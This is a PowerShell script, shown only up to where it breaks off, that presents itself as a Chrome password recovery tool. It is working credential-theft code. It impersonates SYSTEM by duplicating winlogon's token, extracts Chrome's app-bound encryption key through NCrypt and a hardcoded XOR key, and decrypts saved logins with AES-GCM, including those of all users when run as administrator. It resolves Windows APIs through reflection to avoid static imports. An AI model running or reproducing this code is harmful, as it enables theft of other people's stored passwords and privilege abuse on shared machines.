<#
.SYNOPSIS
    Retrieves and decrypts saved Chrome logins for the current user or all users (if running with elevated privileges).

.DESCRIPTION
    This script locates Chrome's login data files, extracts encrypted credentials, and decrypts them using DPAPI.
    Uses the native Windows CryptoAPI for reliable decryption.

.PARAMETER AllUsers
    Extract passwords for all users on the system. Requires administrative privileges.

.PARAMETER OutputFile
    Path to save the extracted passwords. Optional.

.PARAMETER Debug
    Enable debug output for troubleshooting.

.PARAMETER Help
    Show this help message.

.NOTES
    Use at your own risk!
#>

#Requires -Version 5.1

param (
    [switch]$AllUsers,
    [string]$OutputFile,
    [switch]$Debug,
    [Alias("h")]
    [switch]$Help
)

# Display help if requested
if ($Help) {
    Write-Host "`nChrome Password Recovery Tool`n" -ForegroundColor Cyan
    Write-Host "Usage: $($MyInvocation.MyCommand.Name) [OPTIONS]`n" -ForegroundColor White
    Write-Host "Options:" -ForegroundColor Yellow
    Write-Host "  -AllUsers    Extract passwords for all users (requires admin)" -ForegroundColor White
    Write-Host "  -OutputFile  Save results to specified file" -ForegroundColor White
    Write-Host "  -Debug       Enable debug output" -ForegroundColor White
    Write-Host "  -h, --Help   Show this help message`n" -ForegroundColor White
    Write-Host "Use at your own risk!`n" -ForegroundColor Red
    exit 0
}

# Initialize colors for output
 $colors = @{
    Header    = "Cyan"
    Success   = "Green"
    Warning   = "Yellow"
    Error     = "Red"
    Info      = "White"
    Debug     = "Magenta"
    Table     = @("Gray", "White")
}

# Function to write colored output
function Write-ColoredOutput {
    param (
        [string]$Message,
        [string]$Color = "White",
        [switch]$NoNewLine = $false
    )
    
    Write-Host $Message -ForegroundColor $Color -NoNewLine:$NoNewLine
}

# Function to write header
function Write-Header {
    param ([string]$Title)
    
    Write-ColoredOutput "`n$Title`n" $colors.Header
}

# Function to write section header
function Write-Section {
    param ([string]$Title)
    
    Write-ColoredOutput "`n$Title`n" $colors.Header
}

# Check if running with elevated privileges
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)

if ($AllUsers -and -not $isAdmin) {
    Write-ColoredOutput "ERROR: " $colors.Error -NoNewLine
    Write-ColoredOutput "To extract data for all users, this script must be run with elevated privileges.`n" $colors.Info
    exit 1
}

# Function to write debug messages
function Write-DebugMessage {
    param (
        [string]$Message,
        [object]$Data = $null
    )
    
    if ($Debug) {
        Write-ColoredOutput "[DEBUG] $Message" $colors.Debug
        if ($Data -ne $null) {
            Write-ColoredOutput "[DEBUG] Data: $Data" $colors.Debug
        }
    }
}

# Load required assemblies
try {
    Add-Type -AssemblyName System.Security
    Add-Type -AssemblyName System.Core
    Write-DebugMessage "Successfully loaded required assemblies"
}
catch {
    Write-ColoredOutput "ERROR: " $colors.Error -NoNewLine
    Write-ColoredOutput "Failed to load required assemblies: $_`n" $colors.Info
    exit 1
}

# Function to lookup a function in a module
function Invoke-FunctionLookup {
    Param (
        [Parameter(Position = 0, Mandatory = $true)] 
        [string] $moduleName,

        [Parameter(Position = 1, Mandatory = $true)] 
        [string] $functionName
    )

    $systemType = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq "System.dll" }).GetType("Microsoft.Win32.UnsafeNativeMethods")
    $PtrOverload = $systemType.GetMethod("GetProcAddress", [System.Reflection.BindingFlags] "Public,Static", $null, [System.Type[]] @([System.IntPtr], [System.String]), $null)

    if ($PtrOverload) {
        $moduleHandle = $systemType.GetMethod("GetModuleHandle").Invoke($null, @($moduleName))
        return $PtrOverload.Invoke($null, @($moduleHandle, $functionName))
    }
    else {
        $handleRefOverload = $systemType.GetMethod("GetProcAddress", [System.Reflection.BindingFlags] "Public,Static", $null, [System.Type[]] @([System.Runtime.InteropServices.HandleRef], [System.String]), $null)

        if (!$handleRefOverload) { throw "Could not find a suitable GetProcAddress overload on this system." }

        $moduleHandle = $systemType.GetMethod("GetModuleHandle").Invoke($null, @($moduleName))
        $handleRef = New-Object System.Runtime.InteropServices.HandleRef($null, $moduleHandle)
        return $handleRefOverload.Invoke($null, @($handleRef, $functionName))
    }
}

# Function to create a delegate type
function Invoke-GetDelegate {
    Param (
        [Parameter(Position = 0, Mandatory = $true)] 
        [Type[]] $parameterTypes,

        [Parameter(Position = 1, Mandatory = $false)] 
        [Type] $returnType = [Void]
    )

    $assemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object System.Reflection.AssemblyName("DelegateFactory")),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
    )

    $moduleBuilder = $assemblyBuilder.DefineDynamicModule("DelegateFactoryModule", $false)

    $typeBuilder = $moduleBuilder.DefineType(
        "DynamicDelegate", 
        [System.Reflection.TypeAttributes]::Class -bor 
        [System.Reflection.TypeAttributes]::Public -bor 
        [System.Reflection.TypeAttributes]::Sealed -bor 
        [System.Reflection.TypeAttributes]::AnsiClass -bor 
        [System.Reflection.TypeAttributes]::AutoClass, 
        [System.MulticastDelegate]
    )

    $constructorBuilder = $typeBuilder.DefineConstructor(
        [System.Reflection.MethodAttributes]::RTSpecialName -bor 
        [System.Reflection.MethodAttributes]::HideBySig -bor 
        [System.Reflection.MethodAttributes]::Public,
        [System.Reflection.CallingConventions]::Standard,
        $parameterTypes
    )

    $constructorBuilder.SetImplementationFlags(
        [System.Reflection.MethodImplAttributes]::Runtime -bor 
        [System.Reflection.MethodImplAttributes]::Managed
    )

    $methodBuilder = $typeBuilder.DefineMethod(
        'Invoke',
        [System.Reflection.MethodAttributes]::Public -bor 
        [System.Reflection.MethodAttributes]::HideBySig -bor 
        [System.Reflection.MethodAttributes]::NewSlot -bor 
        [System.Reflection.MethodAttributes]::Virtual,
        $returnType,
        $parameterTypes
    )

    $methodBuilder.SetImplementationFlags(
        [System.Reflection.MethodImplAttributes]::Runtime -bor 
        [System.Reflection.MethodImplAttributes]::Managed
    )

    return $typeBuilder.CreateType()
}

# Import the WinSQLite3 class using P/Invoke
try {
    Add-Type @"
        using System;
        using System.Runtime.InteropServices;
        using System.Text;
        
        public class WinSQLite3
        {
            const string dll = "winsqlite3.dll";
            
            [DllImport(dll, EntryPoint = "sqlite3_open")]
            public static extern int Open([MarshalAs(UnmanagedType.LPStr)] string filename, out IntPtr db);
            
            [DllImport(dll, EntryPoint = "sqlite3_prepare16_v2")]
            public static extern int Prepare2(IntPtr db, [MarshalAs(UnmanagedType.LPWStr)] string sql, int numBytes, out IntPtr stmt, IntPtr pzTail);
            
            [DllImport(dll, EntryPoint = "sqlite3_step")]
            public static extern int Step(IntPtr stmt);
            
            [DllImport(dll, EntryPoint = "sqlite3_column_text16")]
            static extern IntPtr ColumnText16(IntPtr stmt, int index);
            
            [DllImport(dll, EntryPoint = "sqlite3_column_bytes")]
            static extern int ColumnBytes(IntPtr stmt, int index);
            
            [DllImport(dll, EntryPoint = "sqlite3_column_blob")]
            static extern IntPtr ColumnBlob(IntPtr stmt, int index);
            
            [DllImport(dll, EntryPoint = "sqlite3_finalize")]
            public static extern int Finalize(IntPtr stmt);
            
            [DllImport(dll, EntryPoint = "sqlite3_close")]
            public static extern int Close(IntPtr db);
            
            [DllImport(dll, EntryPoint = "sqlite3_errmsg16")]
            public static extern IntPtr Errmsg(IntPtr db);
            
            public static string ColumnString(IntPtr stmt, int index)
            { 
                return Marshal.PtrToStringUni(ColumnText16(stmt, index));
            }
            
            public static byte[] ColumnByteArray(IntPtr stmt, int index)
            {
                int length = ColumnBytes(stmt, index);
                byte[] result = new byte[length];
                if (length > 0)
                    Marshal.Copy(ColumnBlob(stmt, index), result, 0, length);
                return result;
            }
            
            public static string GetErrmsg(IntPtr db)
            {
                return Marshal.PtrToStringUni(Errmsg(db));
            }
        }
"@
    
    Write-DebugMessage "Successfully imported WinSQLite3 class"
}
catch {
    Write-ColoredOutput "ERROR: " $colors.Error -NoNewLine
    Write-ColoredOutput "Failed to import WinSQLite3 class: $_`n" $colors.Info
    exit 1
}

# Import BCrypt functions for AES-GCM decryption
try {
    # First, load the bcrypt.dll library
    $loadLibraryADelegate = Invoke-GetDelegate -ParameterTypes @([string]) -ReturnType ([IntPtr])
    $loadLibraryAFunctionPointer = Invoke-FunctionLookup -ModuleName "kernel32.dll" -FunctionName "LoadLibraryA"
    $loadLibraryA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        $loadLibraryAFunctionPointer,
        $loadLibraryADelegate
    )
    
    $libraryHandle = $loadLibraryA.Invoke("bcrypt.dll")
    if ($libraryHandle -eq [IntPtr]::Zero) {
        throw "Failed to load bcrypt.dll"
    }
    
    # Now load the BCrypt functions
    $bcryptOpenAlgorithmProviderFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptOpenAlgorithmProvider'),
        (Invoke-GetDelegate @([IntPtr].MakeByRefType(), [IntPtr], [IntPtr], [int]) ([int])))
    
    $bcryptSetPropertyFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptSetProperty'),
        (Invoke-GetDelegate @([IntPtr], [IntPtr], [IntPtr], [int], [int]) ([int])))
    
    $bcryptGenerateSymmetricKeyFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptGenerateSymmetricKey'),
        (Invoke-GetDelegate @([IntPtr], [IntPtr].MakeByRefType(), [IntPtr], [int], [byte[]], [int], [int]) ([int])))
    
    $bcryptDecryptFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptDecrypt'),
        (Invoke-GetDelegate @([IntPtr], [IntPtr], [int], [IntPtr], [IntPtr], [int], [IntPtr], [int], [Int32].MakeByRefType(), [int]) ([int])))
    
    $bcryptDestroyKeyFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptDestroyKey'),
        (Invoke-GetDelegate @([IntPtr]) ([int])))
    
    $bcryptCloseAlgorithmProviderFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (Invoke-FunctionLookup -ModuleName 'bcrypt.dll' -FunctionName 'BCryptCloseAlgorithmProvider'),
        (Invoke-GetDelegate @([IntPtr], [int]) ([int])))
    
    Write-DebugMessage "Successfully imported BCrypt functions"
}
catch {
    Write-ColoredOutput "ERROR: " $colors.Error -NoNewLine
    Write-ColoredOutput "Failed to import BCrypt functions: $_`n" $colors.Info
    exit 1
}

# Import NCrypt functions for v20 password decryption
try {
    $libraryHandle = $loadLibraryA.Invoke("ncrypt.dll")
    if ($libraryHandle -eq [IntPtr]::Zero) {
        throw "Failed to load ncrypt.dll"
    }
    
    $nCryptOpenStorageProviderFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (Invoke-FunctionLookup -ModuleName 'ncrypt.dll' -FunctionName 'NCryptOpenStorageProvider'),
        (Invoke-GetDelegate @([IntPtr].MakeByRefType(), [IntPtr], [int]) ([int])))
    
    $nCryptOpenKeyFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (Invoke-FunctionLookup -ModuleName 'ncrypt.dll' -FunctionName 'NCryptOpenKey'),
        (Invoke-GetDelegate @([IntPtr], [IntPtr].MakeByRefType(), [IntPtr], [int], [int]) ([int])))
    
    $nCryptDecryptFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (Invoke-FunctionLookup -ModuleName 'ncrypt.dll' -FunctionName 'NCryptDecrypt'),
        (Invoke-GetDelegate @([IntPtr], [byte[]], [int], [IntPtr], [byte[]], [int], [Int32].MakeByRefType(), [uint32]) ([int])))
    
    $nCryptFreeObjectFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (Invoke-FunctionLookup -ModuleName 'ncrypt.dll' -FunctionName 'NCryptFreeObject'),
        (Invoke-GetDelegate @([IntPtr]) ([int])))
    
    Write-DebugMessage "Successfully imported NCrypt functions"
}
catch {
    Write-ColoredOutput "ERROR: " $colors.Error -NoNewLine
    Write-ColoredOutput "Failed to import NCrypt functions: $_`n" $colors.Info
    exit 1
}

# Import token handling functions for impersonation
try {
    $openProcessFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (Invoke-FunctionLookup -ModuleName 'Kernel32.dll' -FunctionName 'OpenProcess'),
        (Invoke-GetDelegate @([UInt32], [bool], [UInt32]) ([IntPtr])))
    
    $openProcessTokenFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (Invoke-FunctionLookup -ModuleName 'Advapi32.dll' -FunctionName 'OpenProcessToken'),
        (Invoke-GetDelegate @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([bool])))
    
    $duplicateTokenExFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (Invoke-FunctionLookup -ModuleName 'Advapi32.dll' -FunctionName 'DuplicateTokenEx'),
        (Invoke-GetDelegate @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([bool])))
    
    $impersonateLoggedOnUserFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (Invoke-FunctionLookup -ModuleName 'Advapi32.dll' -FunctionName 'ImpersonateLoggedOnUser'),
        (Invoke-GetDelegate @([IntPtr]) ([bool])))
    
    $closeHandleFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (Invoke-FunctionLookup -ModuleName 'kernel32.dll' -FunctionName 'CloseHandle'),
        (Invoke-GetDelegate @([IntPtr]) ([bool])))
    
    Write-DebugMessage "Successfully imported token handling functions"
}
catch {
    Write-ColoredOutput "ERROR: " $colors.Error -NoNewLine
    Write-ColoredOutput "Failed to import token handling functions: $_`n" $colors.Info
    exit 1
}

# Import RevertToSelf function
try {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class Advapi32 {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();
}
"@
    
    Write-DebugMessage "Successfully imported RevertToSelf function"
}
catch {
    Write-ColoredOutput "ERROR: " $colors.Error -NoNewLine
    Write-ColoredOutput "Failed to import RevertToSelf function: $_`n" $colors.Info
    exit 1
}

# Function to impersonate SYSTEM
function Invoke-Impersonate {
    $ProcessHandle          = [IntPtr]::Zero
    $TokenHandle            = [IntPtr]::Zero
    $DuplicateTokenHandle   = [IntPtr]::Zero

    $CurrentSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
    if ($CurrentSid -eq 'S-1-5-18') { return $true }

    $WinlogonProcessId = (Get-Process -Name 'winlogon' -ErrorAction Stop | Select-Object -First 1 -ExpandProperty Id)
    $ProcessHandle = $openProcessFunction.Invoke(0x400, $true, [int]$WinlogonProcessId)
    if ($ProcessHandle -eq [IntPtr]::Zero) { return $false }

    $TokenHandle = [IntPtr]::Zero
    if (-not $openProcessTokenFunction.Invoke($ProcessHandle, 0x0E, [ref]$TokenHandle)) { return $false }

    $DuplicateTokenHandle = [IntPtr]::Zero
    if (-not $duplicateTokenExFunction.Invoke($TokenHandle, 0x02000000, [IntPtr]::Zero, 0x02, 0x01, [ref]$DuplicateTokenHandle)) {
        return $false
    }

    try {
        if (-not $impersonateLoggedOnUserFunction.Invoke($DuplicateTokenHandle)) { return $false }

        $NewSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
        return ($NewSid -eq 'S-1-5-18')
    }
    catch {
        return $false
    }
    finally {
        if ($DuplicateTokenHandle -ne [IntPtr]::Zero) { [void]$closeHandleFunction.Invoke($DuplicateTokenHandle) }
        if ($TokenHandle          -ne [IntPtr]::Zero) { [void]$closeHandleFunction.Invoke($TokenHandle)          } 
        if ($ProcessHandle        -ne [IntPtr]::Zero) { [void]$closeHandleFunction.Invoke($ProcessHandle)        }
    }
}

# Function to parse Chrome key blob
function Parse-ChromeKeyBlob {
    param([byte[]]$BlobData)

    if (-not $BlobData -or $BlobData.Length -lt 9) {
        throw "Invalid blob data: too short"
    }

    $CurrentOffset = 0

    # Read header_len (4 bytes, little-endian)
    $HeaderLength = [BitConverter]::ToInt32($BlobData, $CurrentOffset)
    $CurrentOffset += 4

    # Validate header length
    if ($HeaderLength -lt 0 -or $HeaderLength -gt ($BlobData.Length - 8)) {
        throw "Invalid header length: $HeaderLength"
    }

    # Header bytes
    $HeaderBytes = $BlobData[$CurrentOffset..($CurrentOffset + $HeaderLength - 1)]
    $CurrentOffset += $HeaderLength

    # Read content_len (4 bytes, little-endian)  
    $ContentLength = [BitConverter]::ToInt32($BlobData, $CurrentOffset)
    $CurrentOffset += 4

    # Validate length
    if (($HeaderLength + $ContentLength + 8) -ne $BlobData.Length) {
        throw "Length mismatch: headerLen + contentLen + 8 != blobData.Length"
    }

    # Read flag (1 byte)
    $EncryptionFlag = $BlobData[$CurrentOffset]
    $CurrentOffset += 1

    $ParseResult = @{
        Header          = $HeaderBytes
        Flag            = $EncryptionFlag
        Iv              = $null
        Ciphertext      = $null  
        Tag             = $null
        EncryptedAesKey = $null
    }

    if ($EncryptionFlag -eq 1 -or $EncryptionFlag -eq 2) {
        # These flags are identified but not currently supported for decryption
        # [flag|iv|ciphertext|tag] -> [1byte|12bytes|32bytes|16bytes]
        if ($BlobData.Length -lt ($CurrentOffset + 60)) {
            throw "Blob too short for flag $EncryptionFlag"
        }
        
        $ParseResult.Iv = $BlobData[$CurrentOffset..($CurrentOffset + 11)]
        $CurrentOffset += 12
        $ParseResult.Ciphertext = $BlobData[$CurrentOffset..($CurrentOffset + 31)] 
        $CurrentOffset += 32
        $ParseResult.Tag = $BlobData[$CurrentOffset..($CurrentOffset + 15)]
    }
    elseif ($EncryptionFlag -eq 3) {
        # [flag|encrypted_aes_key|iv|ciphertext|tag] -> [1byte|32bytes|12bytes|32bytes|16bytes]
        if ($BlobData.Length -lt ($CurrentOffset + 92)) {
            throw "Blob too short for flag $EncryptionFlag"
        }
        
        $ParseResult.EncryptedAesKey = $BlobData[$CurrentOffset..($CurrentOffset + 31)]
        $CurrentOffset += 32
        $ParseResult.Iv = $BlobData[$CurrentOffset..($CurrentOffset + 11)]
        $CurrentOffset += 12
        $ParseResult.Ciphertext = $BlobData[$CurrentOffset..($CurrentOffset + 31)]
        $CurrentOffset += 32  
        $ParseResult.Tag = $BlobData[$CurrentOffset..($CurrentOffset + 15)]
    }
    else {
        throw "Unsupported flag: $EncryptionFlag"
    }

    return New-Object PSObject -Property $ParseResult
}

# Function to decrypt using AES-GCM
function DecryptWithAesGcm {
    param([byte[]]$Key, [byte[]]$Iv, [byte[]]$Ciphertext, [byte[]]$Tag)

    $AlgorithmHandle = [IntPtr]::Zero
    $KeyHandle       = [IntPtr]::Zero

    try {
        # Open AES algorithm provider
        $AlgorithmIdPointer = [Runtime.InteropServices.Marshal]::StringToHGlobalUni("AES")
        $Status             = $bcryptOpenAlgorithmProviderFunction.Invoke([ref]$AlgorithmHandle, $AlgorithmIdPointer, [IntPtr]::Zero, 0)
        [Runtime.InteropServices.Marshal]::FreeHGlobal($AlgorithmIdPointer)
        if ($Status -ne 0) { throw "BCryptOpenAlgorithmProvider failed: 0x$('{0:X8}' -f $Status)" }

        # Set chaining mode to GCM
        $PropertyNamePointer    = [Runtime.InteropServices.Marshal]::StringToHGlobalUni("ChainingMode")
        $PropertyValuePointer   = [Runtime.InteropServices.Marshal]::StringToHGlobalUni("ChainingModeGCM")
        $PropertyValue         = "ChainingModeGCM"
        $Status                 = $bcryptSetPropertyFunction.Invoke($AlgorithmHandle, $PropertyNamePointer, $PropertyValuePointer, 32, 0)
        [Runtime.InteropServices.Marshal]::FreeHGlobal($PropertyNamePointer)
        [Runtime.InteropServices.Marshal]::FreeHGlobal($PropertyValuePointer)
        if ($Status -ne 0) { throw "BCryptSetProperty failed: 0x$('{0:X8}' -f $Status)" }

        # Generate symmetric key
        $Status = $bcryptGenerateSymmetricKeyFunction.Invoke($AlgorithmHandle, [ref]$KeyHandle, [IntPtr]::Zero, 0, $Key, $Key.Length, 0)
        if ($Status -ne 0) { throw "BCryptGenerateSymmetricKey failed: 0x$('{0:X8}' -f $Status)" }

        # Allocate unmanaged memory for IV, ciphertext, tag, plaintext
        $CiphertextLength   = $Ciphertext.Length
        $PlaintextLength    = $CiphertextLength

        $IvPointer          = [Runtime.InteropServices.Marshal]::AllocHGlobal($Iv.Length)
        $CiphertextPointer  = [Runtime.InteropServices.Marshal]::AllocHGlobal($CiphertextLength)
        $TagPointer         = [Runtime.InteropServices.Marshal]::AllocHGlobal($Tag.Length)
        $PlaintextPointer   = [Runtime.InteropServices.Marshal]::AllocHGlobal($PlaintextLength)

        [Runtime.InteropServices.Marshal]::Copy($Iv, 0, $IvPointer, $Iv.Length)
        [Runtime.InteropServices.Marshal]::Copy($Ciphertext, 0, $CiphertextPointer, $CiphertextLength)
        [Runtime.InteropServices.Marshal]::Copy($Tag, 0, $TagPointer, $Tag.Length)

        # Construct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO manually
        $AuthInfoSize = 96  # Size of struct on 64-bit
        $AuthInfoPointer = [Runtime.InteropServices.Marshal]::AllocHGlobal($AuthInfoSize)
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 0, $AuthInfoSize)           # cbSize
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 4, 1)                       # dwInfoVersion
        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 8, $IvPointer.ToInt64())    # pbNonce
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 16, $Iv.Length)             # cbNonce
        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 24, 0)                      # pbAuthData
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 32, 0)                      # cbAuthData
        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 40, $TagPointer.ToInt64())  # pbTag
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 48, $Tag.Length)            # cbTag
        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 56, 0)                      # pbMacContext
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 64, 0)                      # cbMacContext
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 68, 0)                      # cbAAD
        [Runtime.InteropServices.Marshal]::WriteInt64($AuthInfoPointer, 72, 0)                      # cbData
        [Runtime.InteropServices.Marshal]::WriteInt32($AuthInfoPointer, 80, 0)                      # dwFlags

        # Decrypt
        [int]$ResultLength = 0
        $Status = $bcryptDecryptFunction.Invoke(
            $KeyHandle,
            $CiphertextPointer,
            $CiphertextLength,
            $AuthInfoPointer,
            [IntPtr]::Zero,
            0,
            $PlaintextPointer,
            $PlaintextLength,
            [ref]$ResultLength,
            0
        )

        if ($Status -ne 0) {
            throw "BCryptDecrypt failed: 0x$('{0:X8}' -f $Status)"
        }

        # Copy result
        $PlaintextBytes = New-Object byte[] $ResultLength
        [Runtime.InteropServices.Marshal]::Copy($PlaintextPointer, $PlaintextBytes, 0, $ResultLength)
        return $PlaintextBytes
    }
    finally {
        # Cleanup
        if ($AuthInfoPointer)   { [Runtime.InteropServices.Marshal]::FreeHGlobal($AuthInfoPointer)   }
        if ($PlaintextPointer)  { [Runtime.InteropServices.Marshal]::FreeHGlobal($PlaintextPointer)  }
        if ($CiphertextPointer) { [Runtime.InteropServices.Marshal]::FreeHGlobal($CiphertextPointer) }
        if ($TagPointer)        { [Runtime.InteropServices.Marshal]::FreeHGlobal($TagPointer)        }
        if ($IvPointer)         { [Runtime.InteropServices.Marshal]::FreeHGlobal($IvPointer)         }

        if ($KeyHandle -ne [IntPtr]::Zero)          { [void]$bcryptDestroyKeyFunction.Invoke($KeyHandle) }
        if ($AlgorithmHandle -ne [IntPtr]::Zero)    { [void]$bcryptCloseAlgorithmProviderFunction.Invoke($AlgorithmHandle, 0) }
    }
}

# Function to decrypt with NCrypt
function DecryptWithNCrypt {
    param([byte[]]$InputData)

    try {
        # cryptographic provider and key parameters
        $ProviderName       = "Microsoft Software Key Storage Provider"
        $KeyName            = "Google Chromekey1"
        $NcryptSilentFlag   = 0x40  # NCRYPT_SILENT_FLAG

        $ProviderHandle     = [IntPtr]::Zero
        $KeyHandle          = [IntPtr]::Zero

        Write-DebugMessage "Opening cryptographic storage provider: $ProviderName"
        # Open the cryptographic storage provider
        $ProviderNamePointer    = [Runtime.InteropServices.Marshal]::StringToHGlobalUni($ProviderName)
        $Status                 = $nCryptOpenStorageProviderFunction.Invoke([ref]$ProviderHandle, $ProviderNamePointer, 0)
        [Runtime.InteropServices.Marshal]::FreeHGlobal($ProviderNamePointer)

        if ($Status -ne 0) {
            throw "NCryptOpenStorageProvider failed: $Status"
        }

        Write-DebugMessage "Opening cryptographic key: $KeyName"
        # Open the specific cryptographic key
        $KeyNamePointer = [Runtime.InteropServices.Marshal]::StringToHGlobalUni($KeyName)
        $Status         = $nCryptOpenKeyFunction.Invoke($ProviderHandle, [ref]$KeyHandle, $KeyNamePointer, 0, 0)
        [Runtime.InteropServices.Marshal]::FreeHGlobal($KeyNamePointer)

        if ($Status -ne 0) {
            throw "NCryptOpenKey failed: $Status"
        }

        Write-DebugMessage "Calculating required buffer size for decryption"
        # First call to NCryptDecrypt - Calculate the required buffer size for decryption
        $OutputSize = 0
        $Status     = $nCryptDecryptFunction.Invoke(
            $KeyHandle,             # NCRYPT_KEY_HANDLE - handle to the key
            $InputData,             # pbInput           - input data to decrypt
            $InputData.Length,      # cbInput           - size of input data in bytes
            [IntPtr]::Zero,         # pPaddingInfo      - no padding info (null)
            $null,                  # pbOutput          - null pointer for size query
            0,                      # cbOutput          - zero size for query
            [ref]$OutputSize,       # pcbResult         - receives required buffer size
            $NcryptSilentFlag       # dwFlags           - silent operation flag
        )

        if ($Status -ne 0) {
            throw "1st NCryptDecrypt (size query) failed ($Status)"
        }

        Write-DebugMessage "Required buffer size: $OutputSize"
        # Second call to NCryptDecrypt - perform actual decryption
        $OutputBytes = New-Object byte[] $OutputSize
        $Status      = $nCryptDecryptFunction.Invoke(
            $KeyHandle,             # NCRYPT_KEY_HANDLE - handle to the key
            $InputData,             # pbInput           - input data to decrypt
            $InputData.Length,      # cbInput           - size of input data in bytes
            [IntPtr]::Zero,         # pPaddingInfo      - no padding info (null)
            $OutputBytes,           # pbOutput          - buffer to receive decrypted data
            $OutputBytes.Length,    # cbOutput          - size of output buffer
            [ref]$OutputSize,       # pcbResult         - receives actual bytes written
            $NcryptSilentFlag       # dwFlags           - silent operation flag
        )

        if ($Status -ne 0) {
            throw "2nd NCryptDecrypt (actual decrypt) failed ($Status)"
        }

        Write-DebugMessage "NCrypt decryption successful, output size: $OutputSize"
        return $OutputBytes
    }
    finally {
        # Clean up cryptographic handles
        if ($KeyHandle -ne [IntPtr]::Zero) {
            [void]$nCryptFreeObjectFunction.Invoke($KeyHandle)
        }
        if ($ProviderHandle -ne [IntPtr]::Zero) {
            [void]$nCryptFreeObjectFunction.Invoke($ProviderHandle)
        }
    }
}

# Function to convert hex string to byte array
function HexToBytes {
    param([string]$HexString)

    if ([string]::IsNullOrEmpty($HexString)) {
        throw "Hex string is null or empty"
    }

    # Remove any hyphens or spaces from the hex string
    $HexString = $HexString.Replace("-", "").Replace(" ", "")
    
    # Check if the hex string has an even number of characters
    if ($HexString.Length % 2 -ne 0) {
        throw "Hex string has an odd number of characters"
    }

    $ByteArray = New-Object byte[] ($HexString.Length / 2)
    for ($Index = 0; $Index -lt $ByteArray.Length; $Index++) {
        try {
            $ByteArray[$Index] = [System.Convert]::ToByte($HexString.Substring($Index * 2, 2), 16)
        }
        catch {
            throw "Failed to convert hex string at position $($Index * 2): $_"
        }
    }
    return $ByteArray
}

# Function to XOR two byte arrays
function XorBytes {
    param([byte[]]$FirstArray, [byte[]]$SecondArray)

    if (-not $FirstArray -or -not $SecondArray) {
        throw "One or both input arrays are null"
    }

    if ($FirstArray.Length -ne $SecondArray.Length) { 
        throw "Key lengths mismatch: $($FirstArray.Length) vs $($SecondArray.Length)"
    }

    $ResultArray = New-Object byte[] $FirstArray.Length
    for ($Index = 0; $Index -lt $FirstArray.Length; $Index++) {
        $ResultArray[$Index] = $FirstArray[$Index] -bxor $SecondArray[$Index]
    }
    return $ResultArray
}

# Function to decrypt Chrome key blob
function Decrypt-ChromeKeyBlob {
    param($ParsedData)

    if (-not $ParsedData) {
        throw "Parsed data is null"
    }

    if ($ParsedData.Flag -eq 3) {
        try {
            [byte[]]$XorKey = HexToBytes "CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390"
            Write-DebugMessage "XOR key length: $($XorKey.Length)"
        }
        catch {
            throw "Failed to convert XOR key: $_"
        }

        Invoke-Impersonate > $null

        try {
            if (-not $ParsedData.EncryptedAesKey) {
                throw "Encrypted AES key is null"
            }
            
            Write-DebugMessage "Encrypted AES key length: $($ParsedData.EncryptedAesKey.Length)"
            [byte[]]$DecryptedAesKey = DecryptWithNCrypt -InputData $ParsedData.EncryptedAesKey

            if (-not $DecryptedAesKey) {
                throw "Failed to decrypt AES key"
            }

            Write-DebugMessage "Decrypted AES key length: $($DecryptedAesKey.Length)"
